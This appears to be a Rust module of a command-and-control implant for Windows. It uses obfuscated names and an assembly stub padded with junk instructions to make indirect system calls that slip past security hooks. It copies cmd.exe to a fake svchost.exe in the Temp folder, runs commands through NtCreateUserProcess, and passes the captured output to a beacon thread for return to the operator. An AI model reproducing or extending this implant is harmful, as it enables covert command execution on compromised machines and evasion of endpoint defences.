#![no_main]
use std::os::windows::ffi::OsStringExt;
use std::ffi::OsString;

use std::arch::asm;
use std::ptr;
use std::ffi::c_void;
use std::slice;
use std::arch::global_asm;
use std::collections::BTreeMap;
use std::{ptr::null_mut};
use obfstr::obfstr;
use winapi::um::winnt::LPSTR;
use winapi::shared::sddl::ConvertSidToStringSidA;
use winapi::um::winnt::TOKEN_INFORMATION_CLASS;
use winapi::ctypes::c_void as other_c_void;
use winapi::um::winnt::TOKEN_USER;
use winapi::shared::ntdef::UNICODE_STRING;
use ntapi::ntrtl::RtlConvertSidToUnicodeString;
use winapi::um::winbase::LookupAccountSidA;
use winapi::shared::minwindef::DWORD;
use winapi::um::winnt::LPCSTR;
use winapi::um::winnt::SID;
use std::mem;
use winapi::um::winnt::PSID_NAME_USE;
use winapi::um::winnt::SID_NAME_USE;
use winapi::shared::minwindef::LPDWORD;
use winapi::um::winnt::PSID;
use ntapi::ntrtl::PRTL_USER_PROCESS_PARAMETERS;
use winapi::shared::ntdef::PWSTR;
use ntapi::ntrtl::RtlInitUnicodeString;
use winapi::um::winnt::HANDLE;
use winapi::shared::ntdef::PCWSTR;
use ntapi::ntrtl::RtlCreateProcessParametersEx;
use ntapi::ntpsapi::PS_CREATE_INFO;
use ntapi::ntpsapi::PS_ATTRIBUTE_IMAGE_NAME;
use ntapi::ntpsapi::PPS_ATTRIBUTE_LIST;
use ntapi::ntpsapi::PS_ATTRIBUTE;
use ntapi::ntpsapi::PS_ATTRIBUTE_LIST;
use ntapi::ntrtl::RtlAllocateHeap;
use winapi::um::winnt::HEAP_ZERO_MEMORY;
use ntapi::ntrtl::RtlProcessHeap;
use winapi::um::winnt::PROCESS_ALL_ACCESS;
use winapi::um::winnt::THREAD_ALL_ACCESS;


use winapi::um::winnt::{THREAD_SUSPEND_RESUME, THREAD_SET_CONTEXT, THREAD_GET_CONTEXT};
use winapi::shared::minwindef::PULONG;
use ntapi::ntapi_base::CLIENT_ID;
use winapi::shared::ntdef::OBJECT_ATTRIBUTES;
use winapi::shared::ntdef::NULL;

use winapi::um::winbase::STD_OUTPUT_HANDLE;
use winapi::um::winbase::STD_INPUT_HANDLE;
use winapi::um::winbase::STARTF_USESTDHANDLES;
use winapi::um::namedpipeapi::CreatePipe;
use winapi::um::minwinbase::SECURITY_ATTRIBUTES;
use winapi::um::handleapi::SetHandleInformation;
use winapi::um::winbase::HANDLE_FLAG_INHERIT;
use winapi::um::processenv::GetStdHandle;
use winapi::um::fileapi::ReadFile;
use ntapi::ntpsapi::PROCESS_CREATE_FLAGS_INHERIT_HANDLES;

// this is a test
#[cfg(feature = "winbase")] pub mod winbase;

global_asm!(
    "
.global syscall_exec
.section .text
syscall_exec:
   mov [rsp - 0x8],  rsi
   nop
   mov [rsp - 0x10], rdi
   mov [rsp - 0x18], r12
   mov eax, ecx
   mov r12, rdx
   por mm1, mm1
   mov rcx, r8
   por mm1, mm1
   mov r10, r9
   mov  rdx,  [rsp + 0x28]
   mov  r8,   [rsp + 0x30]
   mov  r9,   [rsp + 0x38]
   sub rcx, 0x4
   nop
   jle skip
   nop
   pand mm0, mm0
   pand mm0, mm0
   lea rsi,  [rsp + 0x40]
   lea rdi,  [rsp + 0x28]
   pand mm0, mm0
   pand mm0, mm0
   rep movsq
skip:
   por mm1, mm1
   por mm1, mm1
   por mm1, mm1
   mov rcx, r12
   mov rsi, [rsp - 0x8]
   por mm1, mm1
   nop
   mov rdi, [rsp - 0x10]
   nop
   pand mm0, mm0
   mov r12, [rsp - 0x18]
   jmp rcx

    "
);

// unique generated command identifier (identifies the target operator -> send to websocket)

extern "C" {
    pub fn syscall_exec(ssn: u16, syscall_address: usize, arg_count: u32, ...) -> i32;
}

#[macro_export]
macro_rules! syscall_macro {
    ($syscall_table:expr, $syscall_name:expr, $($y:expr), +) => {
        {
        let syscall_name = $syscall_name.clone();
        let syscall_table = $syscall_table;
        
        let mut ssn = syscall_table.iter().find(|(key, _)| key == &syscall_name).map(|(_, value)| value).unwrap();
        let mut arg_count:u32 = 0;
        $(
            let _ = $y;
            arg_count += 1;
        )+
        syscall_exec(ssn.1 as u16, ssn.0 as usize, arg_count, $($y), +)
    }}
}

fn wide_string_from_str(s: &str) -> UNICODE_STRING {
    let wide_chars: Vec<u16> = s.encode_utf16().chain(Some(0)).collect();
    let wide_ptr = wide_chars.as_ptr();
    let wide_len = (wide_chars.len() * 2) as u16; // Length in bytes

    let unicode_string = UNICODE_STRING {
        Length: wide_len,
        MaximumLength: wide_len,
        Buffer: wide_ptr as PWSTR,
    };

    // Ensure `wide_chars` is not dropped prematurely
    std::mem::forget(wide_chars);

    unicode_string
}


#[no_mangle]
#[inline(never)]
pub fn main(arg1: *mut c_void) {    
    // START - Indirect Syscall structure creation (received from main thread)

    let address_cafebabe: *const u32 = 0xBAADF000 as *const u32;
    let address = 0xBAADF000 as *mut u8;
    let value: u32 = 5;
    let bytes = value.to_le_bytes(); 
    unsafe {
        for (i, &byte) in bytes.iter().enumerate() {
            core::ptr::write_volatile(address.add(i), byte);
        }
    }

    let mut r14_value: u64 = 0;
    unsafe{
        loop{
            let read_value = std::ptr::read_volatile(address_cafebabe);
            if read_value as u8 == 6{
                unsafe{
                    asm!("mov {}, r14", out(reg) r14_value);
                }
                break
            }
        }
    }

    let ptr: *const BTreeMap<String, (usize, u16)> = r14_value as *const _;
    let btree_map: &BTreeMap<String, (usize, u16)> = unsafe {
        &*ptr
    };

    unsafe{
        let mut sorted_syscalls: Vec<(String, (usize,u16))> = Vec::from_iter(btree_map.clone());

        // END - Indirect Syscall structure creation (received from main thread)
        
        /*
        NTSYSCALLAPI
        NTSTATUS
        NTAPI
        NtCreateUserProcess(
            _Out_ PHANDLE ProcessHandle,
            _Out_ PHANDLE ThreadHandle,
            _In_ ACCESS_MASK ProcessDesiredAccess,
            _In_ ACCESS_MASK ThreadDesiredAccess,
            _In_opt_ POBJECT_ATTRIBUTES ProcessObjectAttributes,
            _In_opt_ POBJECT_ATTRIBUTES ThreadObjectAttributes,
            _In_ ULONG ProcessFlags, // PROCESS_CREATE_FLAGS_*
            _In_ ULONG ThreadFlags, // THREAD_CREATE_FLAGS_*
            _In_opt_ PVOID ProcessParameters, // PRTL_USER_PROCESS_PARAMETERS
            _Inout_ PPS_CREATE_INFO CreateInfo,
            _In_opt_ PPS_ATTRIBUTE_LIST AttributeList
            );

        */ 

        let mut currentProcess : *mut c_void = -1isize as _;
        let mut currentThread: *mut c_void = -1isize as _;
        let mut attributeList: PPS_ATTRIBUTE_LIST = std::ptr::null_mut();

        let mut stdoutHandle: HANDLE = std::ptr::null_mut();

        let mut create_info: PS_CREATE_INFO = unsafe { mem::zeroed() };
        create_info.Size = mem::size_of::<PS_CREATE_INFO>() as usize;
        create_info.State = 0;


        let mut cmd_string_buffer: Vec<u16> = vec![0; 256 as usize];
        let mut image_path: UNICODE_STRING = UNICODE_STRING {
            Length: 0,
            MaximumLength: 256,
            Buffer: cmd_string_buffer.as_mut_ptr()
        };
        use std::fs;
        fs::copy("C:\\Windows\\System32\\cmd.exe", "C:\\Windows\\Temp\\svchost.exe").unwrap();
        let path = "\\??\\C:\\Windows\\Temp\\svchost.exe";

        let wide_path: Vec<u16> = path.encode_utf16().chain(Some(0)).collect();
        unsafe {
            RtlInitUnicodeString(&mut image_path, wide_path.as_ptr());
        }



        let mut param_string_buffer: Vec<u16> = vec![0; 256 as usize];
        let mut params: UNICODE_STRING = UNICODE_STRING {
            Length: 0,
            MaximumLength: 256,
            Buffer: param_string_buffer.as_mut_ptr()
        };

        let params_str = "/k whoami";
        let wide_path: Vec<u16> = params_str.encode_utf16().chain(Some(0)).collect();
        unsafe {
            RtlInitUnicodeString(&mut params, wide_path.as_ptr());
        }

        //let mut cmdline_string_buffer: Vec<u16> = vec![0; 256 as usize];
        //let mut cmdline: UNICODE_STRING = UNICODE_STRING {
        //    Length: 0,
        //    MaximumLength: 256,
        //    Buffer: cmdline_string_buffer.as_mut_ptr()
        //};
        //let cmdline_str = "/k 'echo test'";
        //let wide_path_args: Vec<u16> = cmdline_str.encode_utf16().chain(Some(0)).collect();        
        
        //unsafe {
         //   RtlInitUnicodeString(&mut cmdline, wide_path_args.as_ptr());
        //}

        let mut procParams: PRTL_USER_PROCESS_PARAMETERS = std::ptr::null_mut();

        RtlCreateProcessParametersEx(&mut procParams, &mut image_path, 
        std::ptr::null_mut(), 
        std::ptr::null_mut(), 
        std::ptr::null_mut(), 
        std::ptr::null_mut(), 
        std::ptr::null_mut(), 
        std::ptr::null_mut(), 
        std::ptr::null_mut(),
        std::ptr::null_mut(),
        0x00000001);
        // println!("procParams {:?}", procParams);

        RtlCreateProcessParametersEx(&mut procParams, &mut params, 
            std::ptr::null_mut(), 
            std::ptr::null_mut(), 
            std::ptr::null_mut(), 
            std::ptr::null_mut(), 
            std::ptr::null_mut(), 
            std::ptr::null_mut(), 
            std::ptr::null_mut(),
            std::ptr::null_mut(),
        0x00000001);

        // println!("procParams {:?}", procParams);

        let mut stdout_write: HANDLE = GetStdHandle(STD_OUTPUT_HANDLE);
        let mut stdout_read: HANDLE = null_mut();

        let mut stdin_write: HANDLE = GetStdHandle(STD_INPUT_HANDLE);
        let mut stdin_read: HANDLE = null_mut();
        let mut console_handle_read: HANDLE = null_mut();

        let mut sa: SECURITY_ATTRIBUTES = SECURITY_ATTRIBUTES {
            nLength: mem::size_of::<SECURITY_ATTRIBUTES>() as u32,
            lpSecurityDescriptor: null_mut(),
            bInheritHandle: 1, // Permite herança de handles
        };

        if CreatePipe(&mut stdout_read, &mut stdout_write, &mut sa, 0) == 0 {
            return;
        }



        (*procParams).StandardOutput = stdout_write;
        (*procParams).StandardError = stdout_write;
        (*procParams).WindowFlags = 0x00000100 | 0x00000001; // STARTF_USESTDHANDLES and STARTF_USESHOWWINDOW
        (*procParams).ShowWindowFlags = 0 as u32;

         // Tamanho do caminho da imagem NT em bytes
        let path_length = wide_path.len() * 2; // cada u16 é 2 bytes

        // Aloca memória para PS_ATTRIBUTE_LIST usando RtlAllocateHeap
        let attribute_list_ptr = unsafe {
            RtlAllocateHeap(
                RtlProcessHeap(),
                HEAP_ZERO_MEMORY,
                mem::size_of::<PS_ATTRIBUTE_LIST>(),
            ) as *mut PS_ATTRIBUTE_LIST
        };

        // Verificação de alocação
        if attribute_list_ptr.is_null() {
            // println!("Failed to allocate memory for PS_ATTRIBUTE_LIST");
            return;
        }

        // Inicializa a estrutura PS_ATTRIBUTE_LIST
        let attribute_list: PPS_ATTRIBUTE_LIST = RtlAllocateHeap(
            RtlProcessHeap(),
            HEAP_ZERO_MEMORY,
            std::mem::size_of::<PS_ATTRIBUTE_LIST>(),
        ) as PPS_ATTRIBUTE_LIST;
        attribute_list.as_mut().unwrap().TotalLength = std::mem::size_of::<PS_ATTRIBUTE_LIST>();
        attribute_list.as_mut().unwrap().Attributes[0].Attribute = PS_ATTRIBUTE_IMAGE_NAME;
        attribute_list.as_mut().unwrap().Attributes[0].Size = image_path.Length as usize;
        attribute_list.as_mut().unwrap().Attributes[0].u.Value = image_path.Buffer as usize;

        /*

        NtCreateUserProcess(
    _Out_ PHANDLE ProcessHandle,
    _Out_ PHANDLE ThreadHandle,
    _In_ ACCESS_MASK ProcessDesiredAccess,
    _In_ ACCESS_MASK ThreadDesiredAccess,
    _In_opt_ POBJECT_ATTRIBUTES ProcessObjectAttributes,
    _In_opt_ POBJECT_ATTRIBUTES ThreadObjectAttributes,
    _In_ ULONG ProcessFlags, // PROCESS_CREATE_FLAGS_*
    _In_ ULONG ThreadFlags, // THREAD_CREATE_FLAGS_*
    _In_opt_ PVOID ProcessParameters, // PRTL_USER_PROCESS_PARAMETERS
    _Inout_ PPS_CREATE_INFO CreateInfo,
    _In_opt_ PPS_ATTRIBUTE_LIST AttributeList
    );


        */
        use winapi::um::handleapi::CloseHandle;
        let nt_create_user_process = syscall_macro!(&sorted_syscalls, &obfstr::obfstr!("NtCreateUserProcess").to_string(),
            &mut currentProcess, // ProcessHandle
            &mut currentThread, // ThreadHandle
            PROCESS_ALL_ACCESS, // ProcessDesiredAccess
            THREAD_ALL_ACCESS, // ThreadDesiredAccess
            0 as winapi::shared::ntdef::POBJECT_ATTRIBUTES, // ProcessObjectAttributes
            0 as winapi::shared::ntdef::POBJECT_ATTRIBUTES, // ThreadObjectAttributes
            0x200 | PROCESS_CREATE_FLAGS_INHERIT_HANDLES, // PROCESS_CREATE_FLAGS_
            0, // THREAD_CREATE_FLAGS_
            procParams as *mut c_void, // PRTL_USER_PROCESS_PARAMETERS
            &mut create_info, // CreateInfo
            attribute_list // AttributeListss
        );
        CloseHandle(stdout_write);

        use winapi::um::namedpipeapi::PeekNamedPipe;
        use winapi::um::errhandlingapi::GetLastError;
        use winapi::um::fileapi::FlushFileBuffers;
        use std::time::Instant;

        
        // println!("[external - exec]  NtCreateUserProcess ptr: 0x{:08X}",nt_create_user_process);

        let mut total_output: Vec<u16> = Vec::new();
        let mut buffer: [u16; 4096] = [0; 4096];
        let mut bytes_read: u32 = 0;
        let mut total_bytes_avail: DWORD = 0;

        let mut hit = false;
        let mut time_in_future = 0;

        loop{
            FlushFileBuffers(stdout_read);
            while true{
                let instant2 = Instant::now(); // get RDTSC (loop)
                let instant_bytes: [u8; mem::size_of::<Instant>()] = mem::transmute(instant2);
                let ptr = instant_bytes.as_ptr();
                let tv_sec_ptr = ptr as *const u64; // extracting tv_sec from RDTSC return 
    
                if hit == false{
                    hit = true;
                    time_in_future = *tv_sec_ptr + 1; // previous captured RDTSC (tv_sec) + 20 (seconds)
                }
                if (*tv_sec_ptr) > time_in_future{
                    break;
                }
            }
            let status = PeekNamedPipe(
                stdout_read,
                null_mut(),
                0,
                null_mut(),
                &mut total_bytes_avail as *mut DWORD,
                null_mut(),
            );
            // println!("[external - exec]  Peek - {:?} - {:?}", status, total_bytes_avail);
            if status == 0 || total_bytes_avail == 0 {
                break;
            }

            let result = ReadFile(
                stdout_read,
                buffer.as_mut_ptr() as *mut _,
                buffer.len() as u32 * 2, // 2 bytes por u16
                &mut bytes_read as *mut u32,
                null_mut(),
            );
            // println!("[external - exec]  ReadFile - {:?} - {:?}", result, bytes_read);
            total_output.extend_from_slice(&buffer[..(bytes_read / 2) as usize]); // Lê os u16
        }

        let os_string = OsString::from_wide(&total_output);
        let output = os_string.to_string_lossy();
        // println!("Output:\n{}", output);

        
        //let mut bytes: Vec<u8> = Vec::new(); // memory protocol....
        //bytes.push(6); // incomming response byte 0xBAADF000
        //bytes.push(0); // read control byte 0xBAADF001
        //bytes.extend_from_slice(&data_string_ptr_bytes); // pointer to the string representation of a given data 0xCAFE000A
        //bytes.extend_from_slice(&uniq_id_data_ptr_bytes); // pointer to a string representation of the command ID (c2 handling) 0xCAFE0012

        // start communication with beacon thread -> passing results...



        //let mut data = format!("{}/{}\n{}", domain,name,sid_string);
        //data.push('\0');
        //let boxed_string_1 = Box::new(data);
        //let static_ref_1: &'static str = Box::leak(boxed_string_1);
        //let data_string_ptr = static_ref_1.as_ptr() as *const u8;
        //let data_string_ptr_bytes: [u8; mem::size_of::<*const u8>()] = unsafe { mem::transmute(data_string_ptr) };

        let mut unique_id = String::from("{!unique_command_id}");
        unique_id.push('\0');
        let boxed_string_2 = Box::new(unique_id);
        let static_ref_2: &'static str = Box::leak(boxed_string_2);
        let unique_id_ptr = static_ref_2.as_ptr() as *const u8;
        let uniq_id_data_ptr_bytes: [u8; mem::size_of::<*const u8>()] = unsafe { mem::transmute(unique_id_ptr) };


        let mut bytes: Vec<u8> = Vec::new(); // memory protocol....
        bytes.push(6); // incomming response byte 0xBAADF000
        bytes.push(0); // read control byte 0xBAADF001
        bytes.push(0); // pointer to the string representation of a given data 0xCAFE000A
        bytes.extend_from_slice(&uniq_id_data_ptr_bytes); // pointer to a string representation of the command ID (c2 handling) 0xCAFE0012

        // start communication with beacon thread -> passing results...
        
        let address = 0xBAADF000 as *mut u8;
        unsafe {
            for (i, &byte) in bytes.iter().enumerate() {
                core::ptr::write_volatile(address.wrapping_add(i), byte);
            }
        }

        let address = 0xBAADF001 as *mut u8;
        core::ptr::write_volatile(address, 1);
        
        // end communication with main thread.
        // stop current thread
        let oa : OBJECT_ATTRIBUTES = OBJECT_ATTRIBUTES {
            Length: size_of::<OBJECT_ATTRIBUTES>() as _,
            RootDirectory: NULL,
            ObjectName: NULL as _,
            Attributes: 0,
            SecurityDescriptor: NULL,
            SecurityQualityOfService: NULL
        };

        let mut currentThreadID = 0;
        unsafe {
            asm!("mov {currentThreadID}, gs:[0x48]", currentThreadID = out(reg) currentThreadID);
        }

        let mut ci2 = CLIENT_ID {
            UniqueProcess: 0 as *mut winapi::ctypes::c_void,
            UniqueThread: currentThreadID as *mut winapi::ctypes::c_void,
        };

        let mut previous_suspend_count: PULONG = null_mut();
        let mut thread_handle : *mut c_void = null_mut();
        let open_status = syscall_macro!(&sorted_syscalls, &obfstr::obfstr!("NtOpenThread").to_string(), &mut thread_handle, THREAD_SUSPEND_RESUME, &oa, &ci2);
        let nt_suspend_thread = syscall_macro!(&sorted_syscalls, &obfstr::obfstr!("NtSuspendThread").to_string(), thread_handle,  &mut previous_suspend_count);
    }
}
